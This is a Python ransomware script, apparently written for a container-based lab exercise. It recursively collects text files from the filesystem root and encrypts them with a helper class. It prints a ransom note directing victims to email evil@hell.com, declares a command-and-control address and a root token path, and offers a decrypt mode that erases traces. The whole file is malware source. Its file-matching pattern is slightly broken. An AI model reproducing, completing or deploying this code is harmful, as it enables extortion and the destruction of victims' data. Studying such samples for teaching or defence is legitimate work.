import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter in alphabetical order
        files_list=sorted(Path('/').rglob(filter))
        return files_list

    def encrypt(self):
        # List .txt files
        files_list=self.get_files(".txt")
        
        # Create SecretManager 
        secret_manager = SecretManager()
        
        # Use setup
        secret_manager.setup()

        # Encrypt files
        secret_manager.xorfiles(files_list)
        
        # Message to the victim
        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))

    def decrypt(self):
        # Get the list of encrypted file (.txt files)
        files_list=self.get_files(".txt")

        # Create SecretManager 
        secret_manager = SecretManager()

        #Load the salt and token from the files
        secret_manager.load()

        #Try until the key is right
        while(True):

            try:

                #Ask the victim for the key 
                b64_key=input("Saisir la clé :")

                #Verify the key
                secret_manager.set_key(b64_key)

                #Decrypt files
                secret_manager.xorfiles(files_list)

                #Leave nothing behind
                secret_manager.clean()

                #Message to the victim
                print("Les données ont été restaurées, tout s'est bien passé.")
                
                break

            #Manage the excepetion
            except:
                print("La clé est incorrecte, saisissez la bonne clé si vous voulez vos données.")
                continue

        



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()